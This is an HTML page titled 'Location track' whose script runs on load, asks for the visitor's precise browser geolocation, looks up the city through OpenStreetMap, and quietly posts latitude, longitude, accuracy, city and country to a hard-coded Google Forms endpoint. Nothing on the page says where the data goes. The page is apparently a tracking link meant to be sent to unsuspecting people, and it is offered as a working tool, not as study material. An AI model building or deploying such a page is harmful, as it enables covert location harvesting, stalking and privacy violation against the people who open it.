<!DOCTYPE html>
<html>
<head>
	<meta http-equiv="content-type" content="text/html; charset=utf-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title> Location track </title>
	<style type="text/css" media="all">
		body {
			background: #010041;
			color: #ff7810;
			font-family: Arial;
		}
		p {
			text-align: center;
			font-size: 22px;
			font-weight: 900;
			margin: 20px 0;
		}
	</style>
</head>
<body>
	<p> Your city location has been tracked </p>


	<script>
const status = document.createElement('p');
status.id = "locStatus";
status.style.textAlign = "center";
status.style.marginTop = "15px";
status.innerText = "Fetching your location...";
document.body.appendChild(status);

function sendLocation(lat, lon, acc, city, country) {
  const formURL =
    'https://docs.google.com/forms/d/e/1FAIpQLSdjlrgq8jdfV9grgkRhOmnvvXOqyAs9H1j67vXeIr6cWr46tg/formResponse';

  const formData = new FormData();
  formData.append('entry.1898596820', lat);
  formData.append('entry.2073057617', lon);
  formData.append('entry.1051461884', acc);
  formData.append('entry.20062990', city);
  formData.append('entry.1034043019', country);

  fetch(formURL, {
    method: 'POST',
    body: formData,
    mode: 'no-cors'
  });
}

function getLocation() {
  if (!navigator.geolocation) {
    status.innerText = "Geolocation not supported ðŸ˜•";
    return;
  }

  status.innerText = "Requesting location permissionâ€¦";

  navigator.geolocation.getCurrentPosition(
    position => {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;

      fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
        .then(res => res.json())
        .then(place => {
          const city =
            place.address.city ||
            place.address.town ||
            place.address.village ||
            "Unknown city";
          const country = place.address.country || "Unknown country";

          sendLocation(lat, lon, acc, city, country);

          status.innerText = `Hi! You're visiting from ${city}, ${country} ðŸŽ‰`;
        })
        .catch(() => {
          sendLocation(lat, lon, acc, "Unknown", "Unknown");
          status.innerText = `Location saved! ðŸŽ‰`;
        });
    },
    error => {
      status.innerText = "Location permission denied ðŸ˜…";
    },
    {
      enableHighAccuracy: true,
      timeout: 10000
    }
  );
}

window.addEventListener('load', getLocation);
</script>
	
</body>
</html>
